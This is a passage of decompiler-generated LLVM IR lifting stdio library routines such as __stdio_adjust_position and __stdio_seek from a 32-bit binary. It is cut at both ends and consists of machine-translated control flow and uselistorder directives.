  store i32 %v2_804fd05, i32* %eax.global-to-local, align 4
  %v0_804fd0d.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804fd0d

dec_label_pc_804fd0d:                             ; preds = %dec_label_pc_804fce7, %dec_label_pc_804fcee
  %v0_804fd15 = phi i32 [ %v4_804fcc3, %dec_label_pc_804fce7 ], [ %v0_804fd0d.pre, %dec_label_pc_804fcee ]
  %v1_804fd0d = inttoptr i32 %v0_804fd15 to i8*
  %v2_804fd0d = load i8, i8* %v1_804fd0d, align 1
  %v3_804fd0d = and i8 %v2_804fd0d, 64
  %v4_804fd0d = icmp eq i8 %v3_804fd0d, 0
  br i1 %v4_804fd0d, label %dec_label_pc_804fd22, label %dec_label_pc_804fd12

dec_label_pc_804fd12:                             ; preds = %dec_label_pc_804fd0d
  %v2_804fd16 = call i32 @__stdio_wcommit(i32 %v0_804fd15)
  store i32 %v2_804fd16, i32* %eax.global-to-local, align 4
  %v1_804fd1e = icmp eq i32 %v2_804fd16, 0
  %v1_804fd20 = icmp eq i1 %v1_804fd1e, false
  br i1 %v1_804fd20, label %dec_label_pc_804fd75, label %dec_label_pc_804fd22

dec_label_pc_804fd22:                             ; preds = %dec_label_pc_804fd12, %dec_label_pc_804fd0d
  %v0_804fd22 = load i32, i32* @edi, align 4
  %v9_804fd22 = icmp eq i32 %v0_804fd22, 1
  %v1_804fd25 = icmp eq i1 %v9_804fd22, false
  br i1 %v1_804fd25, label %dec_label_pc_804fd22.dec_label_pc_804fd3b_crit_edge, label %dec_label_pc_804fd27

dec_label_pc_804fd22.dec_label_pc_804fd3b_crit_edge: ; preds = %dec_label_pc_804fd22
  %.pre6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_804fd3b

dec_label_pc_804fd27:                             ; preds = %dec_label_pc_804fd22
  %v0_804fd27 = load i32, i32* @ecx, align 4
  %v2_804fd29 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804fd29, i32* %eax.global-to-local, align 4
  %v0_804fd2e = load i32, i32* @esi, align 4
  %v5_804fd2e = inttoptr i32 %v0_804fd2e to i16*
  %v6_804fd2f = call i32 @__stdio_adjust_position(i16* %v5_804fd2e, i32 %v2_804fd29, i32 %v0_804fd27, i32 %v0_804fd27)
  store i32 %v6_804fd2f, i32* %eax.global-to-local, align 4
  %v2_804fd37 = icmp slt i32 %v6_804fd2f, 0
  br i1 %v2_804fd37, label %dec_label_pc_804fd75, label %dec_label_pc_804fd27.dec_label_pc_804fd3b_crit_edge

dec_label_pc_804fd27.dec_label_pc_804fd3b_crit_edge: ; preds = %dec_label_pc_804fd27
  %v0_804fd3c.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804fd3b

dec_label_pc_804fd3b:                             ; preds = %dec_label_pc_804fd22.dec_label_pc_804fd3b_crit_edge, %dec_label_pc_804fd27.dec_label_pc_804fd3b_crit_edge
  %v2_804fd3d.pre-phi = phi i32 [ %.pre6, %dec_label_pc_804fd22.dec_label_pc_804fd3b_crit_edge ], [ %v2_804fd29, %dec_label_pc_804fd27.dec_label_pc_804fd3b_crit_edge ]
  %v0_804fd3c = phi i32 [ %v0_804fd22, %dec_label_pc_804fd22.dec_label_pc_804fd3b_crit_edge ], [ %v0_804fd3c.pre, %dec_label_pc_804fd27.dec_label_pc_804fd3b_crit_edge ]
  %v0_804fd3b = load i32, i32* @edx, align 4
  store i32 %v2_804fd3d.pre-phi, i32* %eax.global-to-local, align 4
  %v0_804fd42 = load i32, i32* @esi, align 4
  %v5_804fd43 = inttoptr i32 %v2_804fd3d.pre-phi to i32*
  %v6_804fd43 = call i32 @__stdio_seek(i32 %v0_804fd42, i32* %v5_804fd43, i32 %v0_804fd3c, i32 %v0_804fd3b)
  store i32 %v6_804fd43, i32* %eax.global-to-local, align 4
  %v2_804fd4b = icmp slt i32 %v6_804fd43, 0
  br i1 %v2_804fd4b, label %dec_label_pc_804fd75, label %dec_label_pc_804fd4f

dec_label_pc_804fd4f:                             ; preds = %dec_label_pc_804fd3b
  %v0_804fd4f = load i32, i32* @esi, align 4
  %v1_804fd4f = inttoptr i32 %v0_804fd4f to i32*
  %v2_804fd4f = load i32, i32* %v1_804fd4f, align 4
  store i32 %v2_804fd4f, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804fd53 = add i32 %v0_804fd4f, 44
  %v2_804fd53 = inttoptr i32 %v1_804fd53 to i32*
  store i32 0, i32* %v2_804fd53, align 4
  %v0_804fd5a = load i32, i32* @esi, align 4
  %v1_804fd5a = add i32 %v0_804fd5a, 2
  %v2_804fd5a = inttoptr i32 %v1_804fd5a to i8*
  store i8 0, i8* %v2_804fd5a, align 1
  %v0_804fd5e = load i32, i32* %eax.global-to-local, align 4
  %v1_804fd5e = and i32 %v0_804fd5e, -72
  store i32 %v1_804fd5e, i32* %eax.global-to-local, align 4
  %v1_804fd61 = trunc i32 %v1_804fd5e to i16
  %v2_804fd61 = load i32, i32* @esi, align 4
  %v3_804fd61 = inttoptr i32 %v2_804fd61 to i16*
  store i16 %v1_804fd61, i16* %v3_804fd61, align 2
  %v0_804fd64 = load i32, i32* @esi, align 4
  %v1_804fd64 = add i32 %v0_804fd64, 8
  %v2_804fd64 = inttoptr i32 %v1_804fd64 to i32*
  %v3_804fd64 = load i32, i32* %v2_804fd64, align 4
  store i32 %v3_804fd64, i32* %eax.global-to-local, align 4
  %v2_804fd67 = add i32 %v0_804fd64, 16
  %v3_804fd67 = inttoptr i32 %v2_804fd67 to i32*
  store i32 %v3_804fd64, i32* %v3_804fd67, align 4
  %v0_804fd6a = load i32, i32* %eax.global-to-local, align 4
  %v1_804fd6a = load i32, i32* @esi, align 4
  %v2_804fd6a = add i32 %v1_804fd6a, 20
  %v3_804fd6a = inttoptr i32 %v2_804fd6a to i32*
  store i32 %v0_804fd6a, i32* %v3_804fd6a, align 4
  %v0_804fd6d = load i32, i32* %eax.global-to-local, align 4
  %v1_804fd6d = load i32, i32* @esi, align 4
  %v2_804fd6d = add i32 %v1_804fd6d, 24
  %v3_804fd6d = inttoptr i32 %v2_804fd6d to i32*
  store i32 %v0_804fd6d, i32* %v3_804fd6d, align 4
  %v0_804fd70 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fd70 = load i32, i32* @esi, align 4
  %v2_804fd70 = add i32 %v1_804fd70, 28
  %v3_804fd70 = inttoptr i32 %v2_804fd70 to i32*
  store i32 %v0_804fd70, i32* %v3_804fd70, align 4
  br label %dec_label_pc_804fd78

dec_label_pc_804fd75:                             ; preds = %dec_label_pc_804fd3b, %dec_label_pc_804fd27, %dec_label_pc_804fd12
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fd78

dec_label_pc_804fd78:                             ; preds = %dec_label_pc_804fd4f, %dec_label_pc_804fd75
  br i1 %v1_804fcec, label %dec_label_pc_804fd8d, label %dec_label_pc_804fd7c

dec_label_pc_804fd7c:                             ; preds = %dec_label_pc_804fd78
  %v2_804fd80 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804fd80, i32* @eax, align 4
  %v3_804fd85 = call i32 @__pthread_return_void(i32 %v2_804fd80, i32 1)
  store i32 %v3_804fd85, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fd8d

dec_label_pc_804fd8d:                             ; preds = %dec_label_pc_804fd78, %dec_label_pc_804fcd4, %dec_label_pc_804fd7c
  %v0_804fd90 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804fd90, i32* %eax.global-to-local, align 4
  store i32 %v0_804fcb3, i32* @ebx, align 4
  store i32 %v0_804fcb2, i32* @esi, align 4
  store i32 %v0_804fcb1, i32* @edi, align 4
  store i32 %v0_804fcb0, i32* @ebp, align 4
  ret i32 %v0_804fd90

; uselistorder directives
  uselistorder i32 %v2_804fd3d.pre-phi, { 1, 0 }
  uselistorder i32 %v0_804fd22, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 28, { 7, 8, 18, 9, 10, 11, 12, 13, 14, 1, 15, 19, 20, 16, 17, 21, 22, 32, 23, 33, 31, 24, 25, 0, 26, 27, 28, 29, 30, 3, 4, 5, 2, 6 }
  uselistorder i32 24, { 3, 4, 14, 15, 16, 5, 6, 7, 8, 9, 10, 11, 17, 18, 19, 22, 1, 20, 0, 2, 12, 21, 13 }
  uselistorder i32* @ecx, { 37, 38, 39, 30, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 26, 66, 67, 68, 69, 27, 70, 24, 28, 5, 7, 25, 6, 0, 111, 112, 71, 72, 73, 74, 75, 76, 77, 29, 78, 79, 80, 81, 82, 83, 13, 14, 1, 2, 84, 85, 15, 86, 87, 88, 89, 90, 92, 93, 94, 35, 36, 91, 113, 114, 16, 115, 116, 117, 118, 17, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 95, 102, 96, 97, 98, 99, 100, 101, 135, 136, 8, 9, 103, 3, 104, 137, 200, 138, 11, 20, 139, 140, 18, 10, 19, 141, 142, 143, 144, 145, 146, 196, 197, 198, 199, 12, 105, 4, 106, 31, 201, 202, 21, 107, 108, 109, 110, 203, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 22, 172, 148, 149, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 23, 188, 189, 191, 192, 193, 194, 190, 204, 147, 32, 205, 206, 33, 34, 195 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 6, 1, 5, 4, 3, 2, 0 }
  uselistorder i8 0, { 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 0, 64, 65, 66, 126, 67, 31, 3, 6, 7, 32, 5, 4, 127, 128, 129, 68, 69, 42, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 8, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 25, 93, 94, 95, 96, 97, 98, 99, 100, 44, 189, 101, 10, 135, 130, 131, 9, 133, 134, 132, 26, 136, 1, 2, 102, 103, 104, 137, 138, 28, 140, 11, 13, 118, 117, 12, 33, 141, 142, 143, 144, 145, 146, 147, 190, 148, 149, 150, 151, 152, 16, 158, 154, 155, 153, 14, 156, 157, 15, 27, 159, 160, 161, 162, 163, 164, 165, 179, 180, 18, 120, 119, 17, 121, 122, 166, 192, 34, 43, 29, 30, 123, 19, 191, 168, 169, 170, 171, 172, 173, 174, 175, 35, 176, 115, 139, 105, 20, 106, 107, 108, 109, 110, 111, 112, 113, 114, 116, 124, 125, 167, 177, 178, 181, 182, 187, 186, 21, 183, 184, 23, 185, 22, 188, 24, 45, 36, 37, 38, 39, 40, 41 }
  uselistorder i8 64, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 (i32)* @__pthread_return_0, { 30, 26, 25, 24, 23, 22, 21, 5, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 4, 8, 29, 28, 27, 3, 2, 1, 6, 0, 7 }
  uselistorder i32 (i32, i32)* @__pthread_return_void, { 53, 52, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 2, 1, 9, 8, 51, 50, 49, 48, 47, 46, 5, 4, 3, 0, 7, 6 }
  uselistorder i32 134526883, { 2, 17, 18, 3, 19, 4, 5, 20, 21, 22, 6, 7, 8, 24, 25, 26, 27, 28, 29, 0, 9, 10, 11, 12, 13, 14, 15, 16, 1, 23 }
  uselistorder i32 56, { 3, 0, 4, 5, 6, 14, 7, 8, 9, 1, 10, 11, 12, 13, 2 }
  uselistorder i32 52, { 5, 6, 7, 13, 8, 9, 0, 10, 1, 2, 3, 4, 11, 12 }
  uselistorder i32 22, { 1, 2, 3, 8, 10, 11, 0, 4, 5, 6, 7, 9 }
  uselistorder i32* @esi, {}
  uselistorder i32* @edi, { 23, 3, 24, 25, 26, 118, 119, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 4, 38, 39, 40, 41, 42, 43, 44, 5, 120, 121, 19, 122, 123, 124, 18, 125, 45, 46, 6, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 7, 72, 20, 21, 22, 58, 8, 59, 60, 252, 253, 254, 9, 255, 256, 259, 260, 73, 74, 75, 76, 261, 262, 263, 126, 127, 2, 0, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 77, 11, 10, 78, 79, 80, 81, 82, 85, 83, 84, 143, 13, 144, 14, 145, 146, 12, 147, 148, 149, 150, 155, 156, 1, 151, 152, 153, 154, 157, 158, 159, 160, 15, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 264, 265, 266, 267, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 111, 112, 113, 114, 93, 94, 95, 268, 269, 270, 271, 279, 86, 87, 88, 89, 90, 91, 92, 201, 202, 203, 204, 205, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 16, 240, 241, 242, 243, 244, 206, 207, 17, 208, 209, 210, 211, 212, 213, 214, 277, 278, 257, 258, 96, 97, 98, 280, 281, 99, 100, 215, 216, 101, 102, 103, 272, 273, 274, 275, 276, 104, 105, 106, 107, 108, 109, 110, 115, 116, 117, 245, 246, 247, 248, 249, 250, 251 }
  uselistorder i32* @ebp, { 8, 9, 10, 11, 12, 13, 14, 4, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 3, 36, 5, 6, 7, 37, 38, 39, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 40, 41, 42, 43, 44, 45, 46, 2, 75, 76, 77, 82, 78, 79, 80, 81, 83, 84, 0, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 179, 47, 48, 49, 131, 132, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 162, 158, 159, 160, 161, 1, 163, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 144, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 180, 177, 178 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fd8d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fd78, { 1, 0 }
  uselistorder label %dec_label_pc_804fd3b, { 1, 0 }
  uselistorder label %dec_label_pc_804fd0d, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v4_804fda0 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804fda0, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_804fda8 = load i16, i16* %arg1, align 2
  %v3_804fda8 = zext i16 %v2_804fda8 to i32
  store i32 %v3_804fda8, i32* %ecx.global-to-local, align 4
  %tmp = urem i16 %v2_804fda8, 4
  %v1_804fdad = zext i16 %tmp to i32
  %v2_804fdad = icmp eq i16 %tmp, 0
  br i1 %v2_804fdad, label %dec_label_pc_804fddc, label %dec_label_pc_804fdb2

dec_label_pc_804fdb2:                             ; preds = %entry
  %v1_804fdb4 = add nsw i32 %v1_804fdad, -1
  %v8_804fdb4 = icmp eq i32 %v1_804fdb4, 0
  store i32 %v1_804fdb4, i32* @edx, align 4
  br i1 %v8_804fdb4, label %dec_label_pc_804fddc, label %dec_label_pc_804fdb7

dec_label_pc_804fdb7:                             ; preds = %dec_label_pc_804fdb2
  %v3_804fdb7 = and i32 %v3_804fda8, 2048
  %v4_804fdb7 = icmp eq i32 %v3_804fdb7, 0
  br i1 %v4_804fdb7, label %dec_label_pc_804fddc, label %dec_label_pc_804fdbc

dec_label_pc_804fdbc:                             ; preds = %dec_label_pc_804fdb7
  %v6_804fdbc = sub nsw i32 1, %v1_804fdad
  %v7_804fdbc = and i32 %v1_804fdb4, %v6_804fdbc
  %v8_804fdbc = icmp slt i32 %v7_804fdbc, 0
  %v9_804fdbc = icmp eq i16 %tmp, 2
  %v10_804fdbc = icmp ult i16 %tmp, 2
  %v3_804fdbf = icmp eq i1 %v10_804fdbc, %v8_804fdbc
  %v4_804fdbf = icmp eq i1 %v9_804fdbc, false
  %v5_804fdbf = and i1 %v4_804fdbf, %v3_804fdbf
  br i1 %v5_804fdbf, label %dec_label_pc_804fe30, label %dec_label_pc_804fdc1

dec_label_pc_804fdc1:                             ; preds = %dec_label_pc_804fdbc
  %v1_804fdc1 = add i32 %v4_804fda0, 40
  %v2_804fdc1 = inttoptr i32 %v1_804fdc1 to i32*
  %v3_804fdc1 = load i32, i32* %v2_804fdc1, align 4
  %v4_804fdc1 = icmp eq i32 %v3_804fdc1, 0
  %v1_804fdc5 = icmp eq i1 %v4_804fdc1, false
  br i1 %v1_804fdc5, label %dec_label_pc_804fe30, label %dec_label_pc_804fdc7

dec_label_pc_804fdc7:                             ; preds = %dec_label_pc_804fdc1
  %v1_804fdc7 = add i32 %v4_804fda0, 3
  %v2_804fdc7 = inttoptr i32 %v1_804fdc7 to i8*
  %v3_804fdc7 = load i8, i8* %v2_804fdc7, align 1
  %v4_804fdc7 = zext i8 %v3_804fdc7 to i32
  %v2_804fdcb = sub nsw i32 %v1_804fdb4, %v4_804fdc7
  %v1_804fdcd = add i32 %v4_804fda0, 44
  %v2_804fdcd = inttoptr i32 %v1_804fdcd to i32*
  %v3_804fdcd = load i32, i32* %v2_804fdcd, align 4
  %v1_804fdd1 = add nsw i32 %v2_804fdcb, -1
  %tmp12 = icmp slt i32 %v3_804fdcd, 1
  br i1 %tmp12, label %dec_label_pc_804fddc, label %dec_label_pc_804fdd6

dec_label_pc_804fdd6:                             ; preds = %dec_label_pc_804fdc7
  %v1_804fdd6 = add i32 %v4_804fda0, 2
  %v2_804fdd6 = inttoptr i32 %v1_804fdd6 to i8*
  %v3_804fdd6 = load i8, i8* %v2_804fdd6, align 1
  %v4_804fdd6 = zext i8 %v3_804fdd6 to i32
  %v2_804fdda = sub nsw i32 %v1_804fdd1, %v4_804fdd6
  br label %dec_label_pc_804fddc

dec_label_pc_804fddc:                             ; preds = %dec_label_pc_804fdc7, %dec_label_pc_804fdb7, %dec_label_pc_804fdb2, %entry, %dec_label_pc_804fdd6
  %v0_804fdf1 = phi i32 [ %v1_804fdd1, %dec_label_pc_804fdc7 ], [ %v1_804fdb4, %dec_label_pc_804fdb7 ], [ 0, %dec_label_pc_804fdb2 ], [ 0, %entry ], [ %v2_804fdda, %dec_label_pc_804fdd6 ]
  %v2_804fddc = and i32 %v3_804fda8, 64
  %v3_804fddc = icmp eq i32 %v2_804fddc, 0
  %storemerge.in.in.v = select i1 %v3_804fddc, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %v4_804fda0
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_804fde9 = add i32 %v4_804fda0, 16
  %v3_804fde9 = inttoptr i32 %v2_804fde9 to i32*
  %v4_804fde9 = load i32, i32* %v3_804fde9, align 4
  %v5_804fde9 = sub i32 %storemerge, %v4_804fde9
  %v1_804fdec = inttoptr i32 %arg2 to i32*
  %v2_804fdec = load i32, i32* %v1_804fdec, align 4
  store i32 %v2_804fdec, i32* %ecx.global-to-local, align 4
  %v1_804fdee = add i32 %arg2, 4
  %v2_804fdee = inttoptr i32 %v1_804fdee to i32*
  %v3_804fdee = load i32, i32* %v2_804fdee, align 4
  store i32 %v3_804fdee, i32* %ebx.global-to-local, align 4
  %v2_804fdf1 = add i32 %v5_804fde9, %v0_804fdf1
  store i32 %v2_804fdf1, i32* %esi.global-to-local, align 4
  %v5_804fe05 = sub i32 %v2_804fdec, %v2_804fdf1
  %v10_804fe05 = icmp ult i32 %v2_804fdec, %v2_804fdf1
  %v6_804fe09 = zext i1 %v10_804fe05 to i32
  %tmp14 = icmp slt i32 %v2_804fdf1, 0
  %v2_804fdf6.neg = zext i1 %tmp14 to i32
  %v7_804fe09 = add i32 %v3_804fdee, %v2_804fdf6.neg
  %v8_804fe09 = add i32 %v7_804fe09, %v6_804fe09
  store i32 %v8_804fe09, i32* @edx, align 4
  store i32 %v5_804fe05, i32* %v1_804fdec, align 4
  %v0_804fe0f = load i32, i32* @edx, align 4
  %v1_804fe0f = load i32, i32* %edi.global-to-local, align 4
  %v2_804fe0f = add i32 %v1_804fe0f, 4
  %v3_804fe0f = inttoptr i32 %v2_804fe0f to i32*
  store i32 %v0_804fe0f, i32* %v3_804fe0f, align 4
  %v0_804fe12 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fe12 = add i32 %v0_804fe12, 4
  %v2_804fe12 = inttoptr i32 %v1_804fe12 to i32*
  %v3_804fe12 = load i32, i32* %v2_804fe12, align 4
  %v4_804fe12 = load i32, i32* %ebx.global-to-local, align 4
  %v5_804fe15 = icmp slt i32 %v3_804fe12, %v4_804fe12
  br i1 %v5_804fe15, label %dec_label_pc_804fe1f, label %dec_label_pc_804fe17

dec_label_pc_804fe17:                             ; preds = %dec_label_pc_804fddc
  %v8_804fe17 = icmp sgt i32 %v3_804fe12, %v4_804fe12
  br i1 %v8_804fe17, label %dec_label_pc_804fe1d, label %dec_label_pc_804fe19

dec_label_pc_804fe19:                             ; preds = %dec_label_pc_804fe17
  %v1_804fe19 = inttoptr i32 %v0_804fe12 to i32*
  %v2_804fe19 = load i32, i32* %v1_804fe19, align 4
  %v3_804fe19 = load i32, i32* %ecx.global-to-local, align 4
  %tmp15 = icmp ugt i32 %v2_804fe19, %v3_804fe19
  br i1 %tmp15, label %dec_label_pc_804fe1d, label %dec_label_pc_804fe1f

dec_label_pc_804fe1d:                             ; preds = %dec_label_pc_804fe19, %dec_label_pc_804fe17
  %v0_804fe1d = load i32, i32* %esi.global-to-local, align 4
  %v1_804fe1d = sub i32 0, %v0_804fe1d
  store i32 %v1_804fe1d, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fe1f

dec_label_pc_804fe1f:                             ; preds = %dec_label_pc_804fe19, %dec_label_pc_804fddc, %dec_label_pc_804fe1d
  %v0_804fe1f = load i32, i32* %esi.global-to-local, align 4
  %v2_804fe1f = icmp slt i32 %v0_804fe1f, 0
  %v1_804fe21 = icmp eq i1 %v2_804fe1f, false
  br i1 %v1_804fe21, label %dec_label_pc_804fe33, label %dec_label_pc_804fe23

dec_label_pc_804fe23:                             ; preds = %dec_label_pc_804fe1f
  %v1_804fe23 = call i32 @__errno_location(i32 %v2_804fdf1)
  %v1_804fe28 = inttoptr i32 %v1_804fe23 to i32*
  store i32 75, i32* %v1_804fe28, align 4
  %v0_804fe36.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fe33

dec_label_pc_804fe30:                             ; preds = %dec_label_pc_804fdc1, %dec_label_pc_804fdbc
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fe33

dec_label_pc_804fe33:                             ; preds = %dec_label_pc_804fe1f, %dec_label_pc_804fe23, %dec_label_pc_804fe30
  %v0_804fe36 = phi i32 [ %v0_804fe1f, %dec_label_pc_804fe1f ], [ %v0_804fe36.pre, %dec_label_pc_804fe23 ], [ -1, %dec_label_pc_804fe30 ]
  ret i32 %v0_804fe36

; uselistorder directives
  uselistorder i32 %v4_804fe12, { 1, 0 }
  uselistorder i32 %v3_804fe12, { 1, 0 }
  uselistorder i32 %v2_804fdf1, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v1_804fdb4, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_804fda0, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 75, { 1, 0 }
  uselistorder i32 16, { 21, 22, 23, 24, 25, 26, 54, 27, 28, 29, 30, 8, 55, 56, 57, 58, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 13, 46, 47, 48, 49, 96, 60, 59, 0, 61, 62, 9, 5, 63, 10, 97, 64, 65, 98, 99, 100, 66, 7, 6, 67, 68, 69, 70, 71, 72, 79, 73, 74, 75, 76, 77, 78, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 11, 19, 14, 52, 20, 50, 90, 51, 101, 94, 2, 1, 95, 4, 3, 91, 92, 12, 53, 15, 93, 16, 17, 18 }
  uselistorder i32 8, { 30, 45, 46, 47, 48, 49, 50, 51, 32, 31, 52, 53, 54, 79, 80, 81, 82, 55, 83, 56, 84, 0, 1, 44, 57, 58, 59, 60, 62, 63, 64, 61, 65, 66, 67, 68, 16, 17, 69, 70, 71, 72, 73, 74, 153, 154, 155, 86, 85, 87, 2, 3, 88, 89, 90, 91, 92, 93, 6, 94, 4, 15, 156, 95, 96, 157, 158, 159, 97, 98, 99, 100, 101, 33, 18, 19, 20, 21, 34, 22, 23, 35, 36, 24, 37, 25, 38, 39, 160, 27, 161, 28, 162, 29, 43, 26, 75, 103, 102, 76, 77, 107, 108, 109, 110, 111, 112, 113, 7, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 8, 124, 125, 126, 127, 128, 41, 9, 42, 10, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 40, 146, 147, 11, 148, 149, 150, 151, 12, 152, 104, 105, 5, 78, 106, 14, 13 }
  uselistorder i32 20, { 1, 6, 2, 7, 8, 18, 19, 20, 9, 10, 11, 12, 13, 3, 14, 15, 21, 22, 23, 28, 24, 25, 4, 26, 0, 5, 16, 27, 17 }
  uselistorder i32 64, { 2, 7, 1, 3, 8, 0, 4, 6, 9, 5 }
  uselistorder i32 2, { 63, 64, 36, 65, 66, 46, 7, 8, 39, 40, 79, 31, 80, 81, 67, 68, 38, 9, 10, 69, 11, 70, 12, 41, 71, 72, 13, 82, 50, 84, 85, 28, 29, 30, 0, 1, 83, 86, 87, 88, 61, 89, 90, 91, 92, 93, 94, 73, 2, 74, 75, 33, 95, 96, 3, 51, 34, 4, 5, 97, 47, 98, 99, 100, 101, 62, 107, 108, 14, 113, 42, 114, 37, 60, 35, 15, 78, 32, 52, 16, 17, 43, 18, 19, 106, 20, 21, 48, 22, 102, 103, 104, 105, 6, 44, 76, 49, 77, 53, 23, 54, 24, 55, 56, 57, 58, 25, 26, 111, 45, 109, 27, 110, 112, 59 }
  uselistorder i32 44, { 3, 4, 6, 7, 8, 5, 0, 9, 18, 10, 2, 15, 17, 16, 12, 13, 14, 11, 1 }
  uselistorder i32 3, { 31, 0, 19, 11, 20, 29, 18, 13, 14, 32, 33, 34, 35, 36, 37, 21, 1, 12, 2, 22, 3, 15, 38, 23, 5, 4, 6, 9, 10, 8, 7, 30, 25, 39, 16, 17, 26, 27, 28, 24 }
  uselistorder i32 40, { 1, 7, 2, 3, 4, 5, 8, 9, 10, 11, 0, 6 }
  uselistorder i32 2048, { 3, 0, 4, 2, 1, 5 }
  uselistorder i16 0, { 4, 5, 7, 0, 8, 6, 9, 1, 10, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fe33, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fe1f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fddc, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_804fe48 = add i32 %tmp5, 4
  %v2_804fe48 = inttoptr i32 %v1_804fe48 to i32*
  %v3_804fe48 = load i32, i32* %v2_804fe48, align 4
  %v2_804fe4b = load i32, i32* %arg2, align 4
  %v1_804fe51 = add i32 %arg1, 4
  %v2_804fe51 = inttoptr i32 %v1_804fe51 to i32*
  %v3_804fe51 = load i32, i32* %v2_804fe51, align 4
  %v4_804fe54 = call i32 @__libc_lseek64(i32 %v3_804fe51, i32 %v2_804fe4b, i32 %v3_804fe48, i32 %arg3)
  %v0_804fe5c = load i32, i32* @edx, align 4
  %v2_804fe5c = icmp slt i32 %v0_804fe5c, 0
  store i32 %v4_804fe54, i32* %ecx.global-to-local, align 4
  br i1 %v2_804fe5c, label %dec_label_pc_804fe69, label %dec_label_pc_804fe62

dec_label_pc_804fe62:                             ; preds = %entry
  %v1_804fe62 = load i32, i32* @ebx, align 4
  %v2_804fe62 = inttoptr i32 %v1_804fe62 to i32*
